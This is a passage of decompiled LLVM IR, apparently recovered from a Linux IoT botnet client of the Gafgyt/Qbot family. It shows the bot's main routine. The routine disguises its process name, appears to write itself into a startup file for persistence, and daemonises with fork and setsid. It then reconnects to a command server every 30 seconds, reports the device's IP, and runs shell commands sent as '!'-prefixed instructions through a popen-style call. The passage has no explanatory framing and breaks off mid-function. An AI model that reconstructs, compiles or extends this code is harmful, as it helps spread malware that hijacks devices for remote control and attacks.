  uselistorder i32 %v1_e3d8, { 1, 0 }
  uselistorder i32 %v2_e424, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v0_e270, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e510, { 1, 0 }
  uselistorder label %dec_label_pc_e4b4, { 1, 0 }
  uselistorder label %dec_label_pc_e41c, { 1, 0 }
  uselistorder label %dec_label_pc_e3d4, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_19808.258 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e554 = load i32, i32* @r4, align 4
  store i32 %v3_e554, i32* %stack_var_-24, align 4
  store i32 58716, i32* %stack_var_-4, align 4
  %v19_e554 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e558 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e558, i32* @fp, align 4
  %v1_e59c = bitcast i8** %argv to i32*
  %v2_e59c = load i32, i32* %v1_e59c, align 4
  store i32 %v2_e59c, i32* @r4, align 4
  %v2_e5b4 = load i32, i32* %v1_e59c, align 4
  %v1_e5b8 = inttoptr i32 %v2_e5b4 to i8*
  %v3_e5bc = call i32 @strlen(i8* %v1_e5b8)
  %v0_e5c4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_19810.260 to i32), i32* @r1, align 4
  %v3_e5d0 = call i32 @strncpy(i32 %v0_e5c4, i32 ptrtoint (i32* @global_var_19810.260 to i32), i32 %v3_e5bc)
  store i32 ptrtoint (i32* @global_var_19810.260 to i32), i32* %v1_e59c, align 4
  %v0_e60c = call i32 @prctl()
  %v2_e614 = call i32 @__GI_time(i32* null)
  store i32 %v2_e614, i32* @r4, align 4
  %v0_e61c = call i32 @__libc_getpid()
  %v0_e624 = load i32, i32* @r4, align 4
  %v2_e624 = xor i32 %v0_e624, %v0_e61c
  %v1_e62c = call i32 @srand(i32 %v2_e624)
  %v2_e634 = call i32 @__GI_time(i32* null)
  store i32 %v2_e634, i32* @r4, align 4
  %v0_e63c = call i32 @__libc_getpid()
  %v0_e644 = load i32, i32* @r4, align 4
  %v2_e644 = xor i32 %v0_e644, %v0_e63c
  %v1_e64c = call i32 @init_rand(i32 %v2_e644)
  store i32 ptrtoint ([19 x i8]* @global_var_19814.262 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_19828.264 to i32), i32* @r1, align 4
  %v3_e668 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_19814.262 to i32), i32 ptrtoint ([2 x i8]* @global_var_19828.264 to i32))
  %v2_e678 = icmp eq i32 %v3_e668, 0
  br i1 %v2_e678, label %dec_label_pc_e680, label %dec_label_pc_e69c

dec_label_pc_e680:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1982c.266 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_19828.264 to i32), i32* @r1, align 4
  %v3_e690 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1982c.266 to i32), i32 ptrtoint ([2 x i8]* @global_var_19828.264 to i32))
  br label %dec_label_pc_e69c

dec_label_pc_e69c:                                ; preds = %entry, %dec_label_pc_e680
  %stack_var_-88.0 = phi i32 [ %v3_e690, %dec_label_pc_e680 ], [ %v3_e668, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1982c.266, i32 0, i32 0), %dec_label_pc_e680 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19814.262, i32 0, i32 0), %entry ]
  %v2_e6a0 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e6a0, label %dec_label_pc_e838, label %dec_label_pc_e6a8

dec_label_pc_e6a8:                                ; preds = %dec_label_pc_e69c
  %v2_e6b8 = load i32, i32* %v1_e59c, align 4
  %v1_e6bc = inttoptr i32 %v2_e6b8 to i8*
  %v3_e6c0 = call i32 @strlen(i8* %v1_e6bc)
  %v2_e6d4 = ptrtoint i32* %stack_var_-368 to i32
  %v2_e6e0 = call i32 @getcwd(i32 %v2_e6d4, i32 256)
  store i32 ptrtoint (i32* @global_var_1983c.268 to i32), i32* @r1, align 4
  %v2_e6f0 = bitcast i32* %stack_var_-368 to i8*
  %v3_e6f0 = call i32 @__GI_strcoll(i8* %v2_e6f0, i32 ptrtoint (i32* @global_var_1983c.268 to i32))
  %v2_e6f8 = icmp eq i32 %v3_e6f0, 0
  br i1 %v2_e6f8, label %dec_label_pc_e830, label %dec_label_pc_e710

dec_label_pc_e704:                                ; preds = %dec_label_pc_e710
  %v1_e708 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e710

dec_label_pc_e710:                                ; preds = %dec_label_pc_e6a8, %dec_label_pc_e704
  %stack_var_-84.0 = phi i32 [ %v1_e708, %dec_label_pc_e704 ], [ %v3_e6c0, %dec_label_pc_e6a8 ]
  %v2_e720 = load i32, i32* %v1_e59c, align 4
  %v2_e728 = add i32 %v2_e720, %stack_var_-84.0
  %v1_e72c = inttoptr i32 %v2_e728 to i8*
  %v2_e72c = load i8, i8* %v1_e72c, align 1
  %v7_e730 = icmp eq i8 %v2_e72c, 47
  br i1 %v7_e730, label %dec_label_pc_e738, label %dec_label_pc_e704

dec_label_pc_e738:                                ; preds = %dec_label_pc_e710
  %v2_e748 = load i32, i32* %v1_e59c, align 4
  %v2_e750 = add i32 %v2_e748, %stack_var_-84.0
  %v2_e754 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e754, i32* @r0, align 4
  %v7_e768 = call i32 @sprintf(i32 %v2_e754, i32 ptrtoint ([8 x i8]* @global_var_19840.270 to i32), i32 %v2_e6d4, i32 %v2_e750, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e7c4 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e778 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e7a4 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e7c0.outer

dec_label_pc_e770:                                ; preds = %dec_label_pc_e7c0
  %v3_e788 = call i32 @fgets(i32 %v2_e778, i32 1024, i32 %stack_var_-88.0)
  %v3_e7a4 = call i32 @__GI_strcasecmp(i8* %v2_e7a4, i32 %v2_e754)
  %v2_e7ac = icmp eq i32 %v3_e7a4, 0
  br i1 %v2_e7ac, label %dec_label_pc_e7b4, label %dec_label_pc_e7c0

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e770
  %v1_e7b8 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e7c0.outer

dec_label_pc_e7c0.outer:                          ; preds = %dec_label_pc_e7b4, %dec_label_pc_e738
  %stack_var_-80.0.ph = phi i32 [ %v1_e7b8, %dec_label_pc_e7b4 ], [ 0, %dec_label_pc_e738 ]
  br label %dec_label_pc_e7c0

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e7c0.outer, %dec_label_pc_e770
  %v2_e7c4 = call i32 @feof(i8* %v1_e7c4)
  %v2_e7cc = icmp eq i32 %v2_e7c4, 0
  br i1 %v2_e7cc, label %dec_label_pc_e770, label %dec_label_pc_e7d4

dec_label_pc_e7d4:                                ; preds = %dec_label_pc_e7c0
  %v2_e7d8 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_e7e4 = call i32 @__GI_fclose(i8* %v1_e7c4)
  br i1 %v2_e7d8, label %dec_label_pc_e7e0, label %dec_label_pc_e838

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7d4
  %v4_e7e8 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_e7e8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19848.272 to i32), i32* @r1, align 4
  %v3_e7f0 = call i32 @__GI_fopen(i32 %v4_e7e8, i32 ptrtoint (i32* @global_var_19848.272 to i32))
  %v2_e800 = icmp eq i32 %v3_e7f0, 0
  br i1 %v2_e800, label %dec_label_pc_e838, label %dec_label_pc_e808

dec_label_pc_e808:                                ; preds = %dec_label_pc_e7e0
  %v2_e814 = call i32 @__GI_fputs(i32 %v2_e754, i32 %v3_e7f0)
  %v1_e81c = inttoptr i32 %v3_e7f0 to i8*
  %v2_e81c = call i32 @__GI_fclose(i8* %v1_e81c)
  br label %dec_label_pc_e838

dec_label_pc_e830:                                ; preds = %dec_label_pc_e6a8
  %v1_e834 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e834 = call i32 @__GI_fclose(i8* %v1_e834)
  br label %dec_label_pc_e838

dec_label_pc_e838:                                ; preds = %dec_label_pc_e7d4, %dec_label_pc_e7e0, %dec_label_pc_e69c, %dec_label_pc_e808, %dec_label_pc_e830
  %v0_e838 = call i32 @getOurIP()
  %v0_e83c = call i32 @__libc_fork()
  %v2_e84c = icmp eq i32 %v0_e83c, 0
  br i1 %v2_e84c, label %dec_label_pc_e87c, label %dec_label_pc_e8b8

dec_label_pc_e87c:                                ; preds = %dec_label_pc_e838
  %v0_e87c = call i32 @__libc_fork()
  %v2_e88c = icmp eq i32 %v0_e87c, 0
  br i1 %v2_e88c, label %dec_label_pc_e89c.thread, label %dec_label_pc_e8a8

dec_label_pc_e89c.thread:                         ; preds = %dec_label_pc_e87c
  br label %dec_label_pc_e8c4

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e87c
  %v1_e898 = call i32 @__GI_exit(i32 0)
  %v2_e8b0 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1984c.274 to i32))
  br label %dec_label_pc_e8c4

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e838
  %v2_e854 = ptrtoint i32* %stack_var_-112 to i32
  %v3_e864 = call i32 @__libc_waitpid(i32 %v0_e83c, i32 %v2_e854, i32 0)
  %v1_e86c = call i32 @__GI_exit(i32 0)
  %v2_e8c0 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1984c.274 to i32))
  br label %dec_label_pc_e8c4

dec_label_pc_e8c4:                                ; preds = %dec_label_pc_e89c.thread, %dec_label_pc_e8a8, %dec_label_pc_e8b8
  %v0_e8c4 = call i32 @__GI_setsid()
  %v0_e8cc = call i32 @chdir()
  %v2_e8d8 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_f140 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f150 = bitcast i32* %stack_var_-5744 to i8*
  %v2_ec24 = add i32 %v19_e554, -5720
  %v2_eecc = ptrtoint i32* %stack_var_-1648 to i32
  %v2_eedc = bitcast i32* %stack_var_-1648 to i8*
  %v1_ed50 = or i32 %v2_f140, 1
  %v5_ed54 = inttoptr i32 %v1_ed50 to i8*
  %v2_ed70 = or i32 %v2_f140, 2
  %v2_f00c = add i32 %v19_e554, -600
  br label %dec_label_pc_e8e0.outer

dec_label_pc_e8e0.outer:                          ; preds = %dec_label_pc_eca8, %dec_label_pc_f130, %dec_label_pc_e8c4
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_e8c4 ], [ %stack_var_-96.2.ph, %dec_label_pc_f130 ], [ %v1_ecac, %dec_label_pc_eca8 ]
  %v0_e8e024 = call i32 @initConnection()
  %v2_e8e826 = icmp eq i32 %v0_e8e024, 0
  br i1 %v2_e8e826, label %dec_label_pc_e8fc, label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e8e0.outer, %dec_label_pc_e8f0
  %v1_e8f4 = call i32 @sleep(i32 30)
  %v0_e8e0 = call i32 @initConnection()
  %v2_e8e8 = icmp eq i32 %v0_e8e0, 0
  br i1 %v2_e8e8, label %dec_label_pc_e8fc, label %dec_label_pc_e8f0

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e8f0, %dec_label_pc_e8e0.outer
  %v2_e900 = load i32, i32* @global_var_2352c.49, align 4
  store i32 %v2_e900, i32* @r5, align 4
  %v2_e908 = load i32, i32* @global_var_297ac.79, align 4
  store i32 %v2_e908, i32* @r0, align 4
  %v1_e90c = call i32 @__GI_inet_ntoa(i32 %v2_e908)
  store i32 %v1_e90c, i32* @r4, align 4
  %v0_e914 = call i32 @getBuild()
  %v0_e91c = load i32, i32* @r5, align 4
  %v0_e924 = load i32, i32* @r4, align 4
  %v4_e928 = call i32 @Rootsprintf(i32 %v0_e91c, i32 ptrtoint (i32* @global_var_1985c.278 to i32), i32 %v0_e924, i32 %v0_e914)
  br label %dec_label_pc_f130.outer

dec_label_pc_e94c:                                ; preds = %dec_label_pc_ebfc, %dec_label_pc_eba8
  %v3_e950 = mul i32 %v3_ebf0, 4
  %v2_e95c = load i32, i32* @global_var_297b8.68, align 4
  %v2_e960 = add i32 %v2_e95c, %v3_e950
  %v1_e964 = inttoptr i32 %v2_e960 to i32*
  %v2_e964 = load i32, i32* %v1_e964, align 4
  %v3_e974 = call i32 @__libc_waitpid(i32 %v2_e964, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_e974, 1
  br i1 %tmp111, label %dec_label_pc_eb9c, label %dec_label_pc_e9dc

dec_label_pc_e994:                                ; preds = %dec_label_pc_ea38, %dec_label_pc_e9dc
  %v3_e998 = mul i32 %v1_e988, 4
  %v2_e9a4 = load i32, i32* @global_var_297b8.68, align 4
  %v2_e9a8 = add i32 %v2_e9a4, %v3_e998
  %v1_e9ac = add i32 %v2_e9a8, -4
  %v1_e9c8 = inttoptr i32 %v2_e9a8 to i32*
  %v2_e9c8 = load i32, i32* %v1_e9c8, align 4
  %v2_e9cc = inttoptr i32 %v1_e9ac to i32*
  store i32 %v2_e9c8, i32* %v2_e9cc, align 4
  br label %dec_label_pc_e9dc

dec_label_pc_e9dc:                                ; preds = %dec_label_pc_e94c, %dec_label_pc_e994
  %v3_e984.sink = phi i32 [ %v1_e988, %dec_label_pc_e994 ], [ %v3_ebf0, %dec_label_pc_e94c ]
  %v1_e988 = add i32 %v3_e984.sink, 1
  %v2_e9f8 = load i32, i32* @global_var_23534.65, align 4
  %v5_e9f8 = load i32, i32* @global_var_23538.66, align 4
  %tmp112 = icmp ugt i32 %v5_e9f8, %v1_e988
  br i1 %tmp112, label %dec_label_pc_e994, label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e9dc
  %v9_ea30 = icmp eq i32 %v5_e9f8, %v1_e988
  br i1 %v9_ea30, label %dec_label_pc_ea38, label %dec_label_pc_ea50

dec_label_pc_ea38:                                ; preds = %dec_label_pc_ea20
  %v9_ea48 = icmp eq i32 %v2_e9f8, 0
  br i1 %v9_ea48, label %dec_label_pc_ea50, label %dec_label_pc_e994

dec_label_pc_ea50:                                ; preds = %dec_label_pc_ea38, %dec_label_pc_ea20
  %v3_ea54 = mul i32 %v1_e988, 4
  %v2_ea60 = load i32, i32* @global_var_297b8.68, align 4
  %v2_ea64 = add i32 %v3_ea54, -4
  %v1_ea68 = add i32 %v2_ea64, %v2_ea60
  %v2_ea70 = inttoptr i32 %v1_ea68 to i32*
  store i32 0, i32* %v2_ea70, align 4
  %v2_ea78 = load i32, i32* @global_var_23534.65, align 4
  %v5_ea78 = load i32, i32* @global_var_23538.66, align 4
  %v2_ea84 = add i32 %v2_ea78, -1
  %v3_ea84 = icmp ne i32 %v2_ea78, 0
  %v3_ea88 = add i32 %v5_ea78, -1
  %v4_ea88 = zext i1 %v3_ea84 to i32
  %v5_ea88 = add i32 %v3_ea88, %v4_ea88
  store i32 %v2_ea84, i32* @global_var_23534.65, align 4
  store i32 %v5_ea88, i32* @global_var_23538.66, align 4
  %v3_ea9c = udiv i32 %v2_ea84, 1073741824
  %v3_eaa0 = mul i32 %v5_ea88, 4
  %v2_eaa4 = or i32 %v3_eaa0, %v3_ea9c
  store i32 %v2_eaa4, i32* @r4, align 4
  %v3_eaa8 = mul i32 %v2_ea84, 4
  %v1_eaac = add i32 %v3_eaa8, 4
  %v1_eab4 = call i32 @malloc(i32 %v1_eaac)
  br label %dec_label_pc_eb0c

dec_label_pc_eacc:                                ; preds = %dec_label_pc_eb68, %dec_label_pc_eb0c
  %v3_ead0 = mul i32 %v3_eb5c, 4
  %v2_eadc = add i32 %v3_ead0, %v1_eab4
  %v2_eaf0 = load i32, i32* @global_var_297b8.68, align 4
  %v2_eaf4 = add i32 %v2_eaf0, %v3_ead0
  %v1_eaf8 = inttoptr i32 %v2_eaf4 to i32*
  %v2_eaf8 = load i32, i32* %v1_eaf8, align 4
  %v2_eafc = inttoptr i32 %v2_eadc to i32*
  store i32 %v2_eaf8, i32* %v2_eafc, align 4
  %v1_eb04 = add i32 %v3_eb5c, 1
  br label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_ea50, %dec_label_pc_eacc
  %v3_eb5c = phi i32 [ 0, %dec_label_pc_ea50 ], [ %v1_eb04, %dec_label_pc_eacc ]
  %v2_eb28 = load i32, i32* @global_var_23534.65, align 4
  %v5_eb28 = load i32, i32* @global_var_23538.66, align 4
  %tmp113 = icmp ugt i32 %v5_eb28, %v3_eb5c
  br i1 %tmp113, label %dec_label_pc_eacc, label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %dec_label_pc_eb0c
  %v9_eb60 = icmp eq i32 %v5_eb28, %v3_eb5c
  br i1 %v9_eb60, label %dec_label_pc_eb68, label %dec_label_pc_eb80

dec_label_pc_eb68:                                ; preds = %dec_label_pc_eb50
  %v9_eb78 = icmp eq i32 %v2_eb28, 0
  br i1 %v9_eb78, label %dec_label_pc_eb80, label %dec_label_pc_eacc

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb68, %dec_label_pc_eb50
  %v2_eb84 = load i32, i32* @global_var_297b8.68, align 4
  store i32 %v2_eb84, i32* @r0, align 4
  %v0_eb8c = call i32 @free()
  store i32 %v1_eab4, i32* @global_var_297b8.68, align 4
  br label %dec_label_pc_eb9c

dec_label_pc_eb9c:                                ; preds = %dec_label_pc_e94c, %dec_label_pc_eb80
  %v1_eba0 = add i32 %v3_ebf0, 1
  br label %dec_label_pc_eba8

dec_label_pc_eba8:                                ; preds = %dec_label_pc_f130, %dec_label_pc_eb9c
  %v3_ebf0 = phi i32 [ %v1_eba0, %dec_label_pc_eb9c ], [ 0, %dec_label_pc_f130 ]
  %v3_ebb0 = ashr i32 %v3_ebf0, 31
  %v2_ebc0 = load i32, i32* @global_var_23534.65, align 4
  %v5_ebc0 = load i32, i32* @global_var_23538.66, align 4
  %v3_ebdc = icmp uge i32 %v5_ebc0, %v3_ebf0
  %v9_ebdc = icmp eq i32 %v5_ebc0, %v3_ebf0
  %v2_ebe0 = xor i1 %v9_ebdc, true
  %v3_ebe0 = and i1 %v3_ebdc, %v2_ebe0
  br i1 %v3_ebe0, label %dec_label_pc_e94c, label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_eba8
  br i1 %v9_ebdc, label %dec_label_pc_ebfc, label %dec_label_pc_ec14

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_ebe4
  %tmp = icmp ugt i32 %v2_ebc0, %v3_ebb0
  br i1 %tmp, label %dec_label_pc_e94c, label %dec_label_pc_ec14

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ebe4, %dec_label_pc_ebfc
  %v2_ec28 = add i32 %v2_ec24, %v5_f150
  %v3_ec28 = inttoptr i32 %v2_ec28 to i8*
  store i8 0, i8* %v3_ec28, align 1
  %v2_ec44 = call i32 @trim(i8* %v4_f150)
  %v9_ec5c = call i32 @strstr(i32 %v2_f140, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19784.218, i32 0, i32 0), i32 %v2_ec28, i32 %v2_f140, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ec70 = icmp eq i32 %v9_ec5c, %v2_f140
  br i1 %v9_ec70, label %dec_label_pc_f130, label %dec_label_pc_ec78

dec_label_pc_ec78:                                ; preds = %dec_label_pc_ec14
  %v8_ec8c = call i32 @strstr(i32 %v2_f140, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_198c0.283, i32 0, i32 0), i32 %v9_ec5c, i32 %v2_f140, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_eca0 = icmp eq i32 %v8_ec8c, %v2_f140
  br i1 %v9_eca0, label %dec_label_pc_eca8, label %dec_label_pc_ecd4

dec_label_pc_eca8:                                ; preds = %dec_label_pc_ec78
  %v1_ecac = add i32 %stack_var_-96.2.ph, 1
  %v2_ecbc = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_198cc.285 to i32))
  %v7_ecc8 = icmp slt i32 %v1_ecac, 21
  br i1 %v7_ecc8, label %dec_label_pc_e8e0.outer, label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_eca8
  %v1_ecd0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ec78, %dec_label_pc_eccc
  %stack_var_-96.1 = phi i32 [ %v1_ecac, %dec_label_pc_eccc ], [ %stack_var_-96.2.ph, %dec_label_pc_ec78 ]
  %v2_ece8 = load i8, i8* %v4_f150, align 4
  %v7_ecec = icmp eq i8 %v2_ece8, 33
  br i1 %v7_ecec, label %dec_label_pc_ed10, label %dec_label_pc_f130.outer

dec_label_pc_ed10:                                ; preds = %dec_label_pc_ecd4, %dec_label_pc_ed20
  %v3_ecf4.sink = phi i8* [ %storemerge8, %dec_label_pc_ed20 ], [ %v4_f150, %dec_label_pc_ecd4 ]
  %v4_ecf4 = ptrtoint i8* %v3_ecf4.sink to i32
  %v1_ecf8 = add i32 %v4_ecf4, 1
  %storemerge8 = inttoptr i32 %v1_ecf8 to i8*
  %v2_ed14 = load i8, i8* %storemerge8, align 1
  %v7_ed18 = icmp eq i8 %v2_ed14, 32
  br i1 %v7_ed18, label %dec_label_pc_ed30, label %dec_label_pc_ed20

dec_label_pc_ed20:                                ; preds = %dec_label_pc_ed10
  %v2_ed24 = load i8, i8* %storemerge8, align 1
  %v2_ed28 = icmp eq i8 %v2_ed24, 0
  br i1 %v2_ed28, label %dec_label_pc_ed30, label %dec_label_pc_ed10

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ed20, %dec_label_pc_ed10
  %v2_ed34 = load i8, i8* %storemerge8, align 1
  %v2_ed38 = icmp eq i8 %v2_ed34, 0
  br i1 %v2_ed38, label %dec_label_pc_f130.outer, label %dec_label_pc_ed40

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ed30
  store i8 0, i8* %storemerge8, align 1
  %v3_ed60 = call i32 @strlen(i8* %v5_ed54)
  %v1_ed74 = add i32 %v3_ed60, %v2_ed70
  %v5_ed78 = inttoptr i32 %v1_ed74 to i8*
  %v2_edc0 = add i32 %v1_ed74, -1
  br label %dec_label_pc_eda8

dec_label_pc_ed80:                                ; preds = %dec_label_pc_edd4, %dec_label_pc_eda8
  %v3_ed88 = call i32 @strlen(i8* %v5_ed78)
  %v1_ed9c = add i32 %v2_edc0, %v3_ed88
  %v3_eda4 = inttoptr i32 %v1_ed9c to i8*
  store i8 0, i8* %v3_eda4, align 1
  br label %dec_label_pc_eda8

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed40, %dec_label_pc_ed80
  %v3_edb0 = call i32 @strlen(i8* %v5_ed78)
  %v1_edc4 = add i32 %v3_edb0, %v2_edc0
  %v1_edc8 = inttoptr i32 %v1_edc4 to i8*
  %v2_edc8 = load i8, i8* %v1_edc8, align 1
  %v7_edcc = icmp eq i8 %v2_edc8, 10
  br i1 %v7_edcc, label %dec_label_pc_ed80, label %dec_label_pc_edd4

dec_label_pc_edd4:                                ; preds = %dec_label_pc_eda8
  %v3_eddc = call i32 @strlen(i8* %v5_ed78)
  %v1_edf0 = add i32 %v3_eddc, %v2_edc0
  %v1_edf4 = inttoptr i32 %v1_edf0 to i8*
  %v2_edf4 = load i8, i8* %v1_edf4, align 1
  %v7_edf8 = icmp eq i8 %v2_edf4, 13
  br i1 %v7_edf8, label %dec_label_pc_ed80, label %dec_label_pc_ee00

dec_label_pc_ee00:                                ; preds = %dec_label_pc_edd4
  %v2_ee1c28 = load i8, i8* %v5_ed78, align 1
  %v7_ee2032 = icmp eq i8 %v2_ee1c28, 32
  br i1 %v7_ee2032, label %dec_label_pc_ee38, label %dec_label_pc_ee28

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_ee28
  %v1_ee10 = add i32 %v4_ee1834, 1
  %v5_ee14 = inttoptr i32 %v1_ee10 to i8*
  %v2_ee1c = load i8, i8* %v5_ee14, align 1
  %v7_ee20 = icmp eq i8 %v2_ee1c, 32
  br i1 %v7_ee20, label %dec_label_pc_ee38, label %dec_label_pc_ee28

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ee00, %dec_label_pc_ee0c
  %v4_ee1834 = phi i32 [ %v1_ee10, %dec_label_pc_ee0c ], [ %v1_ed74, %dec_label_pc_ee00 ]
  %stack_var_-64.033 = phi i8* [ %v5_ee14, %dec_label_pc_ee0c ], [ %v5_ed78, %dec_label_pc_ee00 ]
  %v2_ee2c = load i8, i8* %stack_var_-64.033, align 1
  %v2_ee30 = icmp eq i8 %v2_ee2c, 0
  br i1 %v2_ee30, label %dec_label_pc_ee38, label %dec_label_pc_ee0c

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ee0c, %dec_label_pc_ee28, %dec_label_pc_ee00
  %stack_var_-64.0.lcssa = phi i8* [ %v5_ed78, %dec_label_pc_ee00 ], [ %v5_ee14, %dec_label_pc_ee0c ], [ %stack_var_-64.033, %dec_label_pc_ee28 ]
  %v4_ee18.lcssa = phi i32 [ %v1_ed74, %dec_label_pc_ee00 ], [ %v1_ee10, %dec_label_pc_ee0c ], [ %v4_ee1834, %dec_label_pc_ee28 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_ee48 = add i32 %v4_ee18.lcssa, 1
  %v2_ee8c39 = load i8, i8* %v5_ed78, align 1
  %v2_ee9041 = icmp eq i8 %v2_ee8c39, 0
  br i1 %v2_ee9041, label %dec_label_pc_ee98, label %dec_label_pc_ee5c

dec_label_pc_ee5c:                                ; preds = %dec_label_pc_ee38, %dec_label_pc_ee5c
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_ee5c ], [ %v5_ed78, %dec_label_pc_ee38 ]
  %storemerge1442 = phi i32 [ %v1_ee80, %dec_label_pc_ee5c ], [ %v1_ed74, %dec_label_pc_ee38 ]
  %v2_ee60 = load i8, i8* %storemerge743, align 1
  %v3_ee60 = zext i8 %v2_ee60 to i32
  %v1_ee68 = call i32 @__GI_toupper(i32 %v3_ee60)
  %v1_ee78 = trunc i32 %v1_ee68 to i8
  store i8 %v1_ee78, i8* %storemerge743, align 1
  %v1_ee80 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_ee80 to i8*
  %v2_ee8c = load i8, i8* %storemerge7, align 1
  %v2_ee90 = icmp eq i8 %v2_ee8c, 0
  br i1 %v2_ee90, label %dec_label_pc_ee98, label %dec_label_pc_ee5c

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee5c, %dec_label_pc_ee38
  store i32 ptrtoint ([11 x i8]* @global_var_198e0.287 to i32), i32* @r1, align 4
  %v4_eea4 = call i32 @__GI_strcoll(i8* %v5_ed78, i32 ptrtoint ([11 x i8]* @global_var_198e0.287 to i32))
  %v2_eeac = icmp eq i32 %v4_eea4, 0
  br i1 %v2_eeac, label %dec_label_pc_eeb4, label %dec_label_pc_ef98

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee98
  %v0_eeb4 = call i32 @listFork()
  %v2_eebc = icmp eq i32 %v0_eeb4, 0
  br i1 %v2_eebc, label %dec_label_pc_eec4, label %dec_label_pc_f130.outer

dec_label_pc_eec4:                                ; preds = %dec_label_pc_eeb4
  store i32 1024, i32* @r2, align 4
  %v3_eedc = call i32 @__GI_memset(i8* %v2_eedc, i32 0)
  %v11_eefc = call i32 @szprintf(i32 %v2_eecc, i32 ptrtoint ([8 x i8]* @global_var_198ec.289 to i32), i32 %v1_ee48, i32 %v2_eecc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_ef18 = call i32 @fdpopen(i32 %v2_eecc, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_19828.264, i32 0, i32 0))
  br label %dec_label_pc_ef60

dec_label_pc_ef28:                                ; preds = %dec_label_pc_ef60
  %v2_ef38 = call i32 @trim(i8* %v2_eedc)
  store i32 1024, i32* @r2, align 4
  %v3_ef54 = call i32 @__GI_memset(i8* %v2_eedc, i32 0)
  %v1_ef5c = call i32 @sleep(i32 1)
  br label %dec_label_pc_ef60

dec_label_pc_ef60:                                ; preds = %dec_label_pc_eec4, %dec_label_pc_ef28
  %v4_ef78 = call i32 @fdgets(i32 %v2_eecc, i32 1024, i32 %v3_ef18, i32 %v2_eecc)
